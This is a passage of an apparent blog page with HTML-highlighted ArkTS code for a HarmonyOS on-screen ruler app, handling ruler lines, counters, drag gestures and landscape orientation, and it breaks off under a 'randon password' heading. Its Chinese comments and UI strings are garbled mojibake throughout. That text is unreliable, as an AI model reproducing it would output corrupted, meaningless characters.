¼å®½åº¦å˜åŒ–</span></span><br><span class="line">  <span class="title function_">onCellWidthChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">maxRulerHeight</span> = <span class="title function_">vp2px</span>(<span class="variable language_">this</span>.<span class="property">containerWidth</span>) / <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> / <span class="number">10</span>; <span class="comment">// æ›´æ–°æœ€å¤§ç›´å°ºé«˜åº¦</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¤„ç†å®¹å™¨é«˜åº¦å˜åŒ–</span></span><br><span class="line">  <span class="title function_">onContainerHeightChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">containerHeight</span> = <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="variable language_">this</span>.<span class="property">containerHeight</span>, <span class="number">53</span>); <span class="comment">// ç¡®ä¿å®¹å™¨é«˜åº¦ä¸å°äº53</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç»„ä»¶å³å°†å‡ºç°æ—¶</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="comment">// è®¾ç½®å½“å‰åº”ç”¨ä¸ºæ¨ªå±æ˜¾ç¤º</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">getLastWindow</span>(<span class="title function_">getContext</span>()).<span class="title function_">then</span>(<span class="function">(<span class="params">windowClass</span>) =&gt;</span> &#123;</span><br><span class="line">      windowClass.<span class="title function_">setPreferredOrientation</span>(<span class="variable language_">window</span>.<span class="property">Orientation</span>.<span class="property">LANDSCAPE</span>); <span class="comment">// è®¾ç½®ä¸ºæ¨ªå±</span></span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–ç›´å°ºçº¿</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">15</span> * <span class="number">10</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">lineHeight</span>: number = (i % <span class="number">10</span> === <span class="number">0</span>) ? <span class="number">90</span> : (i % <span class="number">5</span> === <span class="number">0</span>) ? <span class="number">60</span> : <span class="number">45</span>; <span class="comment">// æ ¹æ®ç´¢å¼•è®¾ç½®çº¿çš„é«˜åº¦</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rulerLines</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">RulerLine</span>(i, lineHeight)); <span class="comment">// å°†æ–°çº¿æ·»åŠ åˆ°æ•°ç»„ä¸­</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºUI</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªåˆ—å¸ƒå±€</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªå †å å¸ƒå±€</span></span><br><span class="line">        <span class="title class_">Stack</span>() &#123; <span class="comment">// åˆ›å»ºå¦ä¸€ä¸ªå †å å¸ƒå±€</span></span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">rulerLines</span>, <span class="function">(<span class="params">line: RulerLine, index: number</span>) =&gt;</span> &#123; <span class="comment">// éå†ç›´å°ºçº¿æ•°ç»„</span></span><br><span class="line">            <span class="title class_">Line</span>()<span class="comment">// åˆ›å»ºä¸€æ¡çº¿</span></span><br><span class="line">              .<span class="title function_">width</span>(<span class="number">1</span>)<span class="comment">// è®¾ç½®çº¿å®½</span></span><br><span class="line">              .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;line.height&#125;</span>px`</span>)<span class="comment">// è®¾ç½®çº¿é«˜</span></span><br><span class="line">              .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// è®¾ç½®çº¿çš„èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">margin</span>(&#123; <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidthInPixels * index&#125;</span>px`</span> &#125;); <span class="comment">// è®¾ç½®çº¿çš„å·¦è¾¹è·</span></span><br><span class="line">            <span class="title class_">Text</span>(line.<span class="title function_">showNumber</span>())<span class="comment">// æ˜¾ç¤ºçº¿çš„ç¼–å·</span></span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">18</span>)<span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">              .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.textWidth&#125;</span>px`</span>)<span class="comment">// è®¾ç½®æ–‡æœ¬å®½åº¦</span></span><br><span class="line">              .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.textWidth&#125;</span>px`</span>)<span class="comment">// è®¾ç½®æ–‡æœ¬é«˜åº¦</span></span><br><span class="line">              .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼</span></span><br><span class="line">              .<span class="title function_">margin</span>(&#123;</span><br><span class="line">                <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidthInPixels * index - <span class="variable language_">this</span>.textWidth / <span class="number">2</span>&#125;</span>px`</span>,</span><br><span class="line">                <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;line.height&#125;</span>px`</span></span><br><span class="line">              &#125;); <span class="comment">// è®¾ç½®æ–‡æœ¬ä½ç½®</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">TopStart</span>); <span class="comment">// è®¾ç½®å †å å¸ƒå±€çš„å®½é«˜å’Œå¯¹é½æ–¹å¼</span></span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">15</span> &#125;) &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªåˆ—å¸ƒå±€ï¼Œè®¾ç½®é—´è·</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`å½“å‰è®¾å¤‡ï¼š<span class="subst">$&#123;deviceInfo.marketName&#125;</span>`</span>).<span class="title function_">fancy</span>(); <span class="comment">// æ˜¾ç¤ºå½“å‰è®¾å¤‡åç§°</span></span><br><span class="line">          <span class="title class_">Counter</span>() &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªè®¡æ•°å™¨</span></span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">`é€‰ä¸­åŒºè·ç¦»ï¼š<span class="subst">$&#123;<span class="variable language_">this</span>.maxRulerHeight.toFixed(<span class="number">2</span>)&#125;</span>å˜ç±³`</span>).<span class="title function_">fancy</span>(); <span class="comment">// æ˜¾ç¤ºé€‰ä¸­åŒºè·ç¦»</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">foregroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®è®¡æ•°å™¨å­—ä½“é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="number">300</span>) <span class="comment">// è®¾ç½®è®¡æ•°å™¨å®½åº¦</span></span><br><span class="line">          .<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å¢åŠ è®¡æ•°å™¨æ—¶çš„å¤„ç†</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">containerHeight</span> = <span class="title function_">px2vp</span>(<span class="title function_">vp2px</span>(<span class="variable language_">this</span>.<span class="property">containerHeight</span>) + <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> / <span class="number">10</span>); <span class="comment">// æ›´æ–°å®¹å™¨é«˜åº¦</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å‡å°‘è®¡æ•°å™¨æ—¶çš„å¤„ç†</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">containerHeight</span> = <span class="title function_">px2vp</span>(<span class="title function_">vp2px</span>(<span class="variable language_">this</span>.<span class="property">containerHeight</span>) - <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> / <span class="number">10</span>); <span class="comment">// æ›´æ–°å®¹å™¨é«˜åº¦</span></span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="title class_">Counter</span>() &#123; <span class="comment">// åˆ›å»ºå¦ä¸€ä¸ªè®¡æ•°å™¨</span></span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">`æ¯æ¯«ç±³é—´è·ï¼š<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidthInPixels.toFixed(<span class="number">2</span>)&#125;</span>px`</span>).<span class="title function_">fancy</span>(); <span class="comment">// æ˜¾ç¤ºæ¯æ¯«ç±³é—´è·</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">foregroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®è®¡æ•°å™¨å­—ä½“é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="number">300</span>) <span class="comment">// è®¾ç½®è®¡æ•°å™¨å®½åº¦</span></span><br><span class="line">          .<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å¢åŠ è®¡æ•°å™¨æ—¶çš„å¤„ç†</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> += <span class="number">0.01</span>; <span class="comment">// å¢åŠ æ¯æ¯«ç±³é—´è·</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å‡å°‘è®¡æ•°å™¨æ—¶çš„å¤„ç†</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> = <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="number">0.01</span>, <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> - <span class="number">0.01</span>); <span class="comment">// å‡å°‘æ¯æ¯«ç±³é—´è·ï¼Œç¡®ä¿ä¸å°äº0.01</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="title class_">RelativeContainer</span>() &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªç›¸å¯¹å¸ƒå±€å®¹å™¨</span></span><br><span class="line">          <span class="title class_">Rect</span>()<span class="comment">// åˆ›å»ºä¸€ä¸ªçŸ©å½¢</span></span><br><span class="line">            .<span class="title function_">fill</span>(<span class="string">&quot;#80019dfe&quot;</span>)<span class="comment">// è®¾ç½®å¡«å……é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">borderColor</span>(<span class="string">&quot;#019dfe&quot;</span>)<span class="comment">// è®¾ç½®è¾¹æ¡†é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">borderWidth</span>(&#123; <span class="attr">left</span>: <span class="number">1</span>, <span class="attr">right</span>: <span class="number">1</span> &#125;)<span class="comment">// è®¾ç½®è¾¹æ¡†å®½åº¦</span></span><br><span class="line">            .<span class="title function_">clip</span>(<span class="literal">true</span>)<span class="comment">// å¯ç”¨è£å‰ª</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">&quot;100%&quot;</span>)<span class="comment">// è®¾ç½®å®½åº¦ä¸º100%</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">&quot;100%&quot;</span>)<span class="comment">// è®¾ç½®é«˜åº¦ä¸º100%</span></span><br><span class="line">            .<span class="title function_">onAreaChange</span>(<span class="function">(<span class="params">oldArea: Area, newArea: Area</span>) =&gt;</span> &#123; <span class="comment">// å¤„ç†åŒºåŸŸå˜åŒ–</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">containerWidth</span> = newArea.<span class="property">width</span> <span class="keyword">as</span> number; <span class="comment">// æ›´æ–°å®¹å™¨å®½åº¦</span></span><br><span class="line">            &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="title class_">Stack</span>() &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªå †å å¸ƒå±€</span></span><br><span class="line">            <span class="title class_">Circle</span>(&#123; <span class="attr">height</span>: <span class="number">30</span>, <span class="attr">width</span>: <span class="number">30</span> &#125;)<span class="comment">// åˆ›å»ºä¸€ä¸ªåœ†å½¢</span></span><br><span class="line">              .<span class="title function_">fill</span>(<span class="string">&quot;#019dfe&quot;</span>)<span class="comment">// è®¾ç½®å¡«å……é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">stroke</span>(<span class="title class_">Color</span>.<span class="property">Transparent</span>)<span class="comment">// è®¾ç½®è¾¹æ¡†é¢œè‰²ä¸ºé€æ˜</span></span><br><span class="line">              .<span class="title function_">strokeWidth</span>(<span class="number">3</span>); <span class="comment">// è®¾ç½®è¾¹æ¡†å®½åº¦</span></span><br><span class="line">            <span class="title class_">Circle</span>(&#123; <span class="attr">height</span>: <span class="number">40</span>, <span class="attr">width</span>: <span class="number">40</span> &#125;)<span class="comment">// åˆ›å»ºå¦ä¸€ä¸ªåœ†å½¢</span></span><br><span class="line">              .<span class="title function_">fill</span>(<span class="title class_">Color</span>.<span class="property">Transparent</span>)<span class="comment">// è®¾ç½®å¡«å……é¢œè‰²ä¸ºé€æ˜</span></span><br><span class="line">              .<span class="title function_">stroke</span>(<span class="string">&quot;#019dfe&quot;</span>)<span class="comment">// è®¾ç½®è¾¹æ¡†é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">strokeWidth</span>(<span class="number">3</span>); <span class="comment">// è®¾ç½®è¾¹æ¡†å®½åº¦</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">hitTestBehavior</span>(<span class="title class_">HitTestMode</span>.<span class="property">Block</span>) <span class="comment">// è®¾ç½®ç¢°æ’æ£€æµ‹è¡Œä¸º</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="number">20</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">          .<span class="title function_">alignRules</span>(&#123;</span><br><span class="line">            <span class="comment">// è®¾ç½®å¯¹é½è§„åˆ™</span></span><br><span class="line">            <span class="attr">center</span>: &#123; <span class="attr">anchor</span>: <span class="string">&quot;__container__&quot;</span>, <span class="attr">align</span>: <span class="title class_">VerticalAlign</span>.<span class="property">Center</span> &#125;, <span class="comment">// å‚ç›´å±…ä¸­</span></span><br><span class="line">            <span class="attr">middle</span>: &#123; <span class="attr">anchor</span>: <span class="string">&quot;__container__&quot;</span>, <span class="attr">align</span>: <span class="title class_">HorizontalAlign</span>.<span class="property">Start</span> &#125; <span class="comment">// å·¦å¯¹é½</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">gesture</span>(<span class="title class_">PanGesture</span>(&#123;</span><br><span class="line">            <span class="comment">// å·¦ä¾§æ‹–åŠ¨æ‰‹åŠ¿</span></span><br><span class="line">            <span class="attr">fingers</span>: <span class="number">1</span>, <span class="comment">// å•æŒ‡æ‹–åŠ¨</span></span><br><span class="line">            <span class="attr">direction</span>: <span class="title class_">PanDirection</span>.<span class="property">Horizontal</span>, <span class="comment">// æ°´å¹³æ‹–åŠ¨</span></span><br><span class="line">            <span class="attr">distance</span>: <span class="number">1</span> <span class="comment">// æœ€å°æ‹–åŠ¨è·ç¦»</span></span><br><span class="line">          &#125;).<span class="title function_">onActionUpdate</span>(<span class="function">(<span class="params">event: GestureEvent</span>) =&gt;</span> &#123; <span class="comment">// æ‹–åŠ¨æ›´æ–°æ—¶çš„å¤„ç†</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">leftOffsetX</span> = <span class="variable language_">this</span>.<span class="property">currentPositionX</span> + event.<span class="property">offsetX</span> / <span class="number">2</span>; <span class="comment">// æ›´æ–°å·¦ä¾§åç§»</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">containerHeight</span> = <span class="variable language_">this</span>.<span class="property">originalContainerHeight</span> - event.<span class="property">offsetX</span>; <span class="comment">// æ›´æ–°å®¹å™¨é«˜åº¦</span></span><br><span class="line">          &#125;).<span class="title function_">onActionEnd</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// æ‹–åŠ¨ç»“æŸæ—¶çš„å¤„ç†</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">currentPositionX</span> = <span class="variable language_">this</span>.<span class="property">leftOffsetX</span>; <span class="comment">// æ›´æ–°ä½ç½®</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">originalContainerHeight</span> = <span class="variable language_">this</span>.<span class="property">containerHeight</span>; <span class="comment">// æ›´æ–°åŸå§‹é«˜åº¦</span></span><br><span class="line">          &#125;));</span><br><span class="line"> </span><br><span class="line">          <span class="title class_">Stack</span>() &#123; <span class="comment">// åˆ›å»ºå¦ä¸€ä¸ªå †å å¸ƒå±€</span></span><br><span class="line">            <span class="title class_">Circle</span>(&#123; <span class="attr">height</span>: <span class="number">30</span>, <span class="attr">width</span>: <span class="number">30</span> &#125;)<span class="comment">// åˆ›å»ºä¸€ä¸ªåœ†å½¢</span></span><br><span class="line">              .<span class="title function_">fill</span>(<span class="string">&quot;#019dfe&quot;</span>)<span class="comment">// è®¾ç½®å¡«å……é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">stroke</span>(<span class="title class_">Color</span>.<span class="property">Transparent</span>)<span class="comment">// è®¾ç½®è¾¹æ¡†é¢œè‰²ä¸ºé€æ˜</span></span><br><span class="line">              .<span class="title function_">strokeWidth</span>(<span class="number">3</span>); <span class="comment">// è®¾ç½®è¾¹æ¡†å®½åº¦</span></span><br><span class="line">            <span class="title class_">Circle</span>(&#123; <span class="attr">height</span>: <span class="number">40</span>, <span class="attr">width</span>: <span class="number">40</span> &#125;)<span class="comment">// åˆ›å»ºå¦ä¸€ä¸ªåœ†</span></span><br><span class="line">              .<span class="title function_">fill</span>(<span class="title class_">Color</span>.<span class="property">Transparent</span>)<span class="comment">// è®¾ç½®å¡«å……é¢œè‰²ä¸ºé€æ˜</span></span><br><span class="line">              .<span class="title function_">stroke</span>(<span class="string">&quot;#019dfe&quot;</span>)<span class="comment">// è®¾ç½®è¾¹æ¡†é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">strokeWidth</span>(<span class="number">3</span>); <span class="comment">// è®¾ç½®è¾¹æ¡†å®½åº¦</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">hitTestBehavior</span>(<span class="title class_">HitTestMode</span>.<span class="property">Block</span>) <span class="comment">// è®¾ç½®ç¢°æ’æ£€æµ‹è¡Œä¸º</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="number">20</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">          .<span class="title function_">alignRules</span>(&#123;</span><br><span class="line">            <span class="comment">// è®¾ç½®å¯¹é½è§„åˆ™</span></span><br><span class="line">            <span class="attr">center</span>: &#123; <span class="attr">anchor</span>: <span class="string">&quot;__container__&quot;</span>, <span class="attr">align</span>: <span class="title class_">VerticalAlign</span>.<span class="property">Center</span> &#125;, <span class="comment">// å‚ç›´å±…ä¸­</span></span><br><span class="line">            <span class="attr">middle</span>: &#123; <span class="attr">anchor</span>: <span class="string">&quot;__container__&quot;</span>, <span class="attr">align</span>: <span class="title class_">HorizontalAlign</span>.<span class="property">End</span> &#125; <span class="comment">// å³å¯¹é½</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">gesture</span>(<span class="title class_">PanGesture</span>(&#123;</span><br><span class="line">            <span class="comment">// å³ä¾§æ‹–åŠ¨æ‰‹åŠ¿</span></span><br><span class="line">            <span class="attr">fingers</span>: <span class="number">1</span>, <span class="comment">// å•æŒ‡æ‹–åŠ¨</span></span><br><span class="line">            <span class="attr">direction</span>: <span class="title class_">PanDirection</span>.<span class="property">Horizontal</span>, <span class="comment">// æ°´å¹³æ‹–åŠ¨</span></span><br><span class="line">            <span class="attr">distance</span>: <span class="number">1</span> <span class="comment">// æœ€å°æ‹–åŠ¨è·ç¦»</span></span><br><span class="line">          &#125;).<span class="title function_">onActionUpdate</span>(<span class="function">(<span class="params">event: GestureEvent</span>) =&gt;</span> &#123; <span class="comment">// æ‹–åŠ¨æ›´æ–°æ—¶çš„å¤„ç†</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">leftOffsetX</span> = <span class="variable language_">this</span>.<span class="property">currentPositionX</span> + event.<span class="property">offsetX</span> / <span class="number">2</span>; <span class="comment">// æ›´æ–°å·¦ä¾§åç§»</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">containerHeight</span> = <span class="variable language_">this</span>.<span class="property">originalContainerHeight</span> + event.<span class="property">offsetX</span>; <span class="comment">// æ›´æ–°å®¹å™¨é«˜åº¦</span></span><br><span class="line">          &#125;).<span class="title function_">onActionEnd</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// æ‹–åŠ¨ç»“æŸæ—¶çš„å¤„ç†</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">currentPositionX</span> = <span class="variable language_">this</span>.<span class="property">leftOffsetX</span>; <span class="comment">// æ›´æ–°ä½ç½®</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">originalContainerHeight</span> = <span class="variable language_">this</span>.<span class="property">containerHeight</span>; <span class="comment">// æ›´æ–°åŸå§‹é«˜åº¦</span></span><br><span class="line">          &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="variable language_">this</span>.<span class="property">containerHeight</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">&quot;100%&quot;</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: <span class="variable language_">this</span>.<span class="property">leftOffsetX</span> &#125;) <span class="comment">// ä½¿ç”¨å·¦ä¾§åç§»</span></span><br><span class="line">        .<span class="title function_">gesture</span>(<span class="title class_">PanGesture</span>(&#123;</span><br><span class="line">          <span class="comment">// å·¦ä¾§æ‹–åŠ¨æ‰‹åŠ¿</span></span><br><span class="line">          <span class="attr">fingers</span>: <span class="number">1</span>, <span class="comment">// å•æŒ‡æ‹–åŠ¨</span></span><br><span class="line">          <span class="attr">direction</span>: <span class="title class_">PanDirection</span>.<span class="property">Horizontal</span>, <span class="comment">// æ°´å¹³æ‹–åŠ¨</span></span><br><span class="line">          <span class="attr">distance</span>: <span class="number">1</span> <span class="comment">// æœ€å°æ‹–åŠ¨è·ç¦»</span></span><br><span class="line">        &#125;).<span class="title function_">onActionUpdate</span>(<span class="function">(<span class="params">event: GestureEvent</span>) =&gt;</span> &#123; <span class="comment">// æ‹–åŠ¨æ›´æ–°æ—¶çš„å¤„ç†</span></span><br><span class="line">          <span class="keyword">if</span> (event) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">leftOffsetX</span> = <span class="variable language_">this</span>.<span class="property">currentPositionX</span> + event.<span class="property">offsetX</span>; <span class="comment">// æ›´æ–°å·¦ä¾§åç§»</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).<span class="title function_">onActionEnd</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// æ‹–åŠ¨ç»“æŸæ—¶çš„å¤„ç†</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">currentPositionX</span> = <span class="variable language_">this</span>.<span class="property">leftOffsetX</span>; <span class="comment">// æ›´æ–°ä½ç½®</span></span><br><span class="line">        &#125;));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;.<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦å’Œå®½åº¦</span></span><br><span class="line">    .<span class="title function_">padding</span>(&#123; <span class="attr">left</span>: <span class="number">30</span>, <span class="attr">right</span>: <span class="number">10</span> &#125;) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#181b22&quot;</span>); <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="randon-password"><a href="#randon-password" class="headerlink" title="randon password"></a>randon password</h1><p>éšæœºå¯†ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span 